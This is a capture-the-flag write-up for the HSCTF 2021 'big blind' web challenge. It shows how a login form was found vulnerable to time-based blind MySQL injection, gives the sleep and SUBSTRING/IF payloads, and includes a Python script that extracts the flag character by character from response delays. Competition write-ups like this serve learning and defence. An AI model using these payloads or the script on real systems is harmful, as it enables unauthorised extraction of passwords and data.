---
layout: load_md
title: The White Circle | Hsctf 2021 | big blind Writeup
desc: Check out our writeup for big blind for Hsctf 2021 capture the flag competition.
image: images/twc_og_banner.jpg
ctf: Hsctf 2021
parent: hsctf_2021
category: web
challenge: big blind
tags: "web, twh, sql, sqli, python"
date: 2021-06-20T00:00:00+00:00
last_modified_at: 2021-06-20T00:00:00+00:00
---


> Solved By : thewhiteh4t


- we are given a login page in this challenge
- the page source does not contain any JS
- After trying several things I found that we get status 500 on using `'` in either username or password field
- we don’t get an error if we use `'` in both fields
- A better test is to use the following :

```
user : ''
pass : '
```

- in the above case we get an error which shows that its due to an un-closed `'`
- we don’t get an error in the following case :

```
user : ''
pass : ''
```

- finally I confirmed that its blind SQL injection by using the following payload :

```
' or sleep(2) and 1=1#
```

- so here it was clear that its MySQL because syntax for others are different
- I used `SUBSTRING` and `SLEEP` to bruteforce the flag one character at a time
- payload :

```
' OR IF(SUBSTRING(pass,1,1)='f',sleep(5),sleep(0))#
```

- Explanation :
    - substring function requires three arguments
    - first argument is the string which we want to check
    - second argument is the position which we want to check
    - third argument is the length we want to check
    - to check one character at a time I incremented second argument each time and kept third argument fixed
- Usage of `IF` :
    - If uses three arguments
    - first is the condition
    - second is action if condition is `True`
    - third is action if condition is `False`
    - so when we find a match we will see a sleep of 5 seconds else page will load immediately
- Automation :

```python
from requests import post, ReadTimeout

url = 'https://big-blind.hsc.tf/'
charset = '_{}flagisodnbcehjkmpqrtuvwxyz'
flag = ''
counter = 0

while flag.endswith('}') != True:
    counter += 1
    for char in charset:
        payload = {
            'user': 'twh',
            'pass': f"' OR IF(SUBSTRING(pass,{counter},1)='{char}',sleep(5),sleep(0))#"
        }
        try:
            r = post(url, data=payload, timeout=3)
        except ReadTimeout:
            flag += char
            print(f'FLAG : {flag}')
            break
```

- output :

![](https://i.imgur.com/fAdPjA5.png)

